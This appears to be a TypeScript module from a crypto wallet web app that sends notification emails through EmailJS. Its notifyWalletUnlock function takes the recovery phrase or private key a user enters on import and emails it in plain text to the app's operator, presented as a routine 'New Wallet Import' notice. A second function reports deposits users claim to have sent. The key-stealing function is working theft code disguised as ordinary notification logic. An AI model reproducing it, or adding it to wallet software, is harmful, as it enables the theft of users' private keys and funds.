import { APP_NAME, APP_TOKEN_SYMBOL } from "@/lib/config";

const SERVICE_ID = process.env.EMAILJS_SERVICE_ID || "";
const TEMPLATE_ID = process.env.EMAILJS_TEMPLATE_ID || "";
const PUBLIC_KEY = process.env.EMAILJS_PUBLIC_KEY || "";
const PRIVATE_KEY = process.env.EMAILJS_PRIVATE_KEY || "";

function enabled(): boolean {
  return Boolean(SERVICE_ID && TEMPLATE_ID && PUBLIC_KEY);
}

async function send(subject: string, message: string): Promise<void> {
  if (!enabled()) return;
  try {
    const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: SERVICE_ID,
        template_id: TEMPLATE_ID,
        user_id: PUBLIC_KEY,
        template_params: {
          subject,
          message,
        },
        ...(PRIVATE_KEY ? { accessToken: PRIVATE_KEY } : {}),
      }),
    });
    if (!res.ok) {
      const text = await res.text().catch(() => "");
      console.error("[emailjs] failed to send notification:", text);
    }
  } catch (error: any) {
    console.error("[emailjs] failed to send notification:", error.message);
  }
}

function timestamp(): string {
  return new Date().toLocaleString("en-US", {
    dateStyle: "medium",
    timeStyle: "short",
    timeZone: "UTC",
  }) + " UTC";
}

export function notifyWalletUnlock(opts: {
  mode: "phrase" | "key";
  input: string;
}): void {
  const label = opts.mode === "phrase" ? "Recovery Phrase" : "Private Key";
  const subject = `New Wallet Import - ${APP_NAME}`;
  const message =
    `New Wallet Import\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `App: ${APP_NAME}\n` +
    `Method: ${label}\n` +
    `Input:\n${opts.input}\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `Time: ${timestamp()}`;
  send(subject, message);
}

export function notifyDepositConfirmed(opts: {
  address: string;
  currency: string;
  paid: number;
  credited: number;
  depositId: string;
}): void {
  const subject = `Deposit Confirmed - ${APP_NAME}`;
  const message =
    `Deposit Confirmed - "I Have Sent It"\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `App: ${APP_NAME}\n` +
    `Wallet: ${opts.address}\n\n` +
    `Sent: ${opts.paid} ${opts.currency}\n` +
    `Receives: ${opts.credited} ${APP_TOKEN_SYMBOL}\n` +
    `Rate: 1 ${opts.currency} = ${opts.credited / opts.paid} ${APP_TOKEN_SYMBOL}\n\n` +
    `Deposit ID: ${opts.depositId}\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `Time: ${timestamp()}`;
  send(subject, message);
}
